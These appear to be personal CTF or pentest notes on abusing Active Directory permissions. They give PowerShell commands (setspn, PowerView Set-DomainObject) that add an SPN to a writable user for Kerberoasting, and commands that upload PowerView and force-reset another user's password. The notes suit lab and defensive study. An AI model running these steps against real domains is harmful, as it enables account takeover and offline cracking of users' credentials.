## Notes On ACL's

### GenericWrite 

Tie an SPN to the user whom you have *GenericWrite* on, and invoke a *Kerberoast* to get a crackable hash

```powershell
# setspn should be available on the DC

setspn -a MSSQLSvc/<DOMAIN>:1433 <DOMAIN>\<USER

# Example

setspn -a MSSQLSvc/megacorp.local:1433 megacorp.local\jorden
```

Alternatively, import *PowerView* and use it to tie the SPN.

```powershell
Set-DomainObject -Identity <USER> -SET @{serviceprincipalname='nonexistent/tobeatelite'}

# Example

Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/tobeatelite'}
```

Check to make sure that the SPN was created successfully. You should see the new SPN and the username in the output.

```powershell
Get-NetUser -SPN | select serviceprincipalname
```

If successful: Kerberoast.

### ForceChangePassword

ez pwn

```powershell
cd /temp
upload /home/tobeatelite/ctf/tools/PowerView.ps1
. .\PowerView.ps1
$newpass = ConvertTo-SecureString 'Tobeatelite%' -AsPlainText -Force
Set-DomainUserPassword -Identity <USER> -AccountPassword $newpass
```
